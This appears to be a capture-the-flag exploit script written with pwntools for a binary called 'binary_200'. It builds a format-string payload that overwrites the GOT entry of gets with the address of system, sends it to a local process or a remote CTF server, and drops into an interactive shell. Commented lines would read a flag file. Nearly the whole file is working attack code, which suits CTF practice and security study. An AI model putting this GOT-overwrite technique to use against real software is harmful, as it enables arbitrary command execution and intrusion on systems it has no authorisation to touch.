#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'

fn = './binary_200'

elf = ELF(fn)

gets_got = elf.got['gets']
system_addr = elf.plt['system'] + 6

assert system_addr == 0x8048416
# system_plt = elf.symbols['system']
# system_plt = 0x08048406

log.info('gets_got = %s', hex(gets_got))
log.info('system_addr = %s', hex(system_addr))

# fmtlen = 28

# _ = (system_addr >> 16) & 0xffff  # 0x0804
# assert _ == 0x0804
# pls = {
#     0: ((5 + fmtlen // 4), _),
#     1: ((5 + fmtlen // 4 + 1), (system_addr & 0xffff) - _),
# }
# log.debug(pls)

w0 = (system_addr >> 16) & 0xffff
assert w0 == 0x0804
w1 = system_addr & 0xffff

payload = 'sh;~{addr1}{addr2}%{w0}c%{o0}$hn%{w1}c%{o1}$hn'.format(
    addr1=p32(gets_got + 2),
    addr2=p32(gets_got),
    o0=6,
    o1=7,
    w0=(w0 - 12),
    w1=(w1 - w0 - 12),
)
log.debug('payload = %s', repr(payload))
log.debug('len(payload) = %s', len(payload))

# sys.exit(0)

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('bamboofox.cs.nctu.edu.tw', 22002)

# payload = ''.join([
#     fmt.ljust(fmtlen, '#'),
#     p32(gets_got + 2),
#     p32(gets_got),
# ])

# raw_input('w')

io.sendline(payload)

# raw_input('w')

io.recv(0xffff, timeout=20)

raw_input('x')

# io.sendline('/bin/sh')

# sleep(1)

# io.sendline('cat /home/ctf/flag')
# flag = io.recv(1024, timeout=1)
# io.close()
# log.success(flag)


io.interactive()
